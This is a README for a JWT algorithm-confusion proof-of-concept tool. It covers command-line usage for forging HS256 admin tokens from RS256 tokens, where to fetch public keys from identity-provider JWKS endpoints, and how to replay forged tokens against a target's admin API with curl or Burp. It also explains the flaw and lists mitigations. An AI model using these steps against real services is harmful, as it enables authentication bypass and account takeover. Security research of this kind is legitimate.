# 🔐 JWT Algorithm Confusion Attack POC

<div align="center">
  <img src="https://media.giphy.com/media/3o7TKSjRrfIPjeiVyM/giphy.gif" width="200"/>
</div>

<div align="center">
  
![Python](https://img.shields.io/badge/Python-3.7%2B-blue)
![Security](https://img.shields.io/badge/Security-Research-red)
![JWT](https://img.shields.io/badge/JWT-Algorithm_Confusion-yellow)
![Stars](https://img.shields.io/github/stars/your-username/jwt-algorithm-confusion-poc?style=social)

</div>

<div align="center">
  <h3><b>🚀 Transform RS256 → HS256 & Unlock Admin Access! 🚀</b></h3>
  <p><i>"When applications expect RSA but accept HMAC, the public key becomes the secret key"</i></p>
</div>

---

## ⚡ What is This About?

Ever wondered what happens when a JWT application expects **RSA-signed tokens** (RS256) but accidentally accepts **HMAC-signed tokens** (HS256)? 

**BOOM!** 💥 You can use the **RSA public key** as an **HMAC secret** to forge valid admin tokens! This is the digital equivalent of using someone's house key as a master key for the entire neighborhood.

<div align="center">
  <img src="https://media.giphy.com/media/26ufdipQqU2lhNA4g/giphy.gif" width="300"/>
</div>

## 🎯 Attack Overview

```mermaid
graph LR
    A[Original JWT<br/>RS256] -->|Algorithm: RS256| B[Server expects RSA]
    C[Forged JWT<br/>HS256] -->|Algorithm: HS256| D[Server accepts HMAC]
    E[RSA Public Key] -->|Used as| F[HMAC Secret]
    C -->|Signed with| E
    style A fill:#ffcccc
    style C fill:#ccffcc
    style E fill:#ccccff
```

## 🛠️ Features

| Feature | Description | Status |
|---------|-------------|--------|
| 🔍 **JWT Analysis** | Decode and analyze JWT tokens | ✅ |
| 🔑 **Key Extraction** | Auto-fetch from JWKS endpoints | ✅ |
| 🔄 **Algorithm Swap** | RS256 → HS256 conversion | ✅ |
| 🏗️ **Token Forging** | Create admin-level tokens | ✅ |
| 🧪 **Multiple Formats** | Test various key formats | ✅ |
| 🎯 **Manual Mode** | Interactive key input | ✅ |
| 📁 **Output Options** | Save forged tokens to file | ✅ |

## 🚀 Quick Start

### Prerequisites
```bash
pip install pyjwt cryptography requests termcolor
```

### Method 1: Using Existing JWT + Public Key
```bash
# Basic attack
python jwt_confusion.py -j "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..." -k public_key.pem

# With custom admin claims
python jwt_confusion.py -j "your.jwt.token" -k public_key.pem -p '{"role":"admin","user":"superadmin"}'

# Save output to file
python jwt_confusion.py -j "your.jwt.token" -k public_key.pem -o forged_admin_token.txt
```

### Method 2: Auto-Fetch from JWKS
```bash
# Auto-fetch public key from JWKS
python jwt_confusion.py -j "your.jwt.token" -jwk "https://target.com/.well-known/jwks.json"
```

### Method 3: Manual Mode (Interactive)
```bash
# Interactive mode - I'll help you get the key!
python jwt_confusion.py -j "your.jwt.token" --manual
```

## 🎮 Demo Mode
```bash
# Test with generated keys
python jwt_confusion.py --demo
```

<div align="center">
  <img src="https://media.giphy.com/media/l0HlPystfePnAIgCc/giphy.gif" width="250"/>
</div>

## 📋 Usage Examples

### Example 1: Basic Attack
```bash
$ python jwt_confusion.py -j "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoidXNlcjEifQ..." -k public_key.pem

[SUCCESS] Forged token created!
Forged JWT Token:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.signature_here
```

### Example 2: Auto-Fetch + Custom Claims
```bash
$ python jwt_confusion.py -j "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..." -jwk "https://auth.example.com/.well-known/jwks.json" -p '{"admin":true,"permissions":["*"]}'

[SUCCESS] Public key obtained from JWKS!
[SUCCESS] Forged token created with custom claims!
```

### Example 3: Manual Mode (Getting Keys)
```bash
$ python jwt_confusion.py -j "your.jwt.token" --manual

[JWT Analysis]
Algorithm: RS256
Key ID: kid-123
Issuer: https://auth.example.com

[Choose Method to Get Public Key]
1. Auto-find JWKS endpoint
2. Use issuer well-known endpoints  
3. Manual conversion tools
4. Show me what to look for in browser

Enter choice (1-4): 1
```

## 🔍 How to Get Public Keys

### Method 1: JWKS Endpoint
```
https://[domain]/.well-known/jwks.json
https://[domain]/jwks.json
```

### Method 2: From JWT Issuer
Decode your JWT → Get `iss` claim → Try:
```
https://[issuer]/.well-known/openid-configuration
```

### Method 3: Cloud Provider Endpoints
| Provider | Endpoint Pattern |
|----------|------------------|
| **Auth0** | `https://[domain]/.well-known/jwks.json` |
| **AWS Cognito** | `https://cognito-idp.[region].amazonaws.com/[pool-id]/.well-known/jwks.json` |
| **Azure AD** | `https://login.microsoftonline.com/[tenant]/discovery/v2.0/keys` |
| **Firebase** | `https://www.googleapis.com/service_accounts/v1/jwk/securetoken@system.gserviceaccount.com` |
| **Okta** | `https://[domain].okta.com/oauth2/v1/keys` |

<div align="center">
  <img src="https://media.giphy.com/media/3o7TKSjRrfIPjeiVyM/giphy.gif" width="200"/>
</div>

## 🧪 Testing Your Forged Token

### Using curl:
```bash
curl -H "Authorization: Bearer YOUR_FORGED_TOKEN" https://target.com/api/admin
```

### Using Burp Suite:
1. Capture the original request
2. Replace JWT with forged token
3. Forward request
4. 🎉 Profit!

### Common Headers to Test:
```
Authorization: Bearer <token>
X-JWT-Token: <token>
Cookie: jwt=<token>
X-Auth-Token: <token>
```

## 🛡️ Vulnerability Explanation

### The Problem:
```json
// Original Token (RS256)
{
  "alg": "RS256",
  "typ": "JWT"
}
// Server expects: RSA signature verification

// Forged Token (HS256) 
{
  "alg": "HS256",
  "typ": "JWT"
}
// Server accepts: HMAC verification using public key as secret!
```

### Why It Works:
- **RS256**: Uses asymmetric crypto (private key signs, public key verifies)
- **HS256**: Uses symmetric crypto (same key for sign/verify)
- When server accepts both → public key becomes the shared secret!

<div align="center">
  <img src="https://media.giphy.com/media/26ufdipQqU2lhNA4g/giphy.gif" width="250"/>
</div>

## 🚨 Mitigation Recommendations

| Vulnerability | Fix |
|---------------|-----|
| **Algorithm Confusion** | Explicitly specify allowed algorithms |
| **Key Type Mismatch** | Verify key type matches algorithm |
| **Algorithm Trust** | Don't trust JWT header `alg` field |
| **Multiple Algorithms** | Disable HS256 if only RS256 needed |

## 🎯 Real-World Impact

- **Privilege Escalation**: User → Admin
- **Authentication Bypass**: No login required
- **Account Takeover**: Impersonate any user
- **Data Access**: Read/modify protected resources

### Further Reading:
- [JWT.io - Introduction](https://jwt.io/introduction)
- [RFC 7519 - JWT Specification](https://tools.ietf.org/html/rfc7519)
- [PortSwigger JWT Attacks](https://portswigger.net/web-security/jwt)
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)

## ⚠️ Legal Disclaimer

**This tool is for educational and testing purposes only!**  
⚠️ Use only on systems you own or have explicit permission to test  
⚠️ Unauthorized use may violate laws and regulations  
⚠️ The authors are not responsible for misuse

<div align="center">
  <h3>🔥 Happy Hacking! 🔥</h3>
  <img src="https://media.giphy.com/media/3o7TKSjRrfIPjeiVyM/giphy.gif" width="200"/>
</div>

---

<div align="center">
  <p><i>Made with ❤ ️ by the Presh-Cyber</i></p>
</div>

---

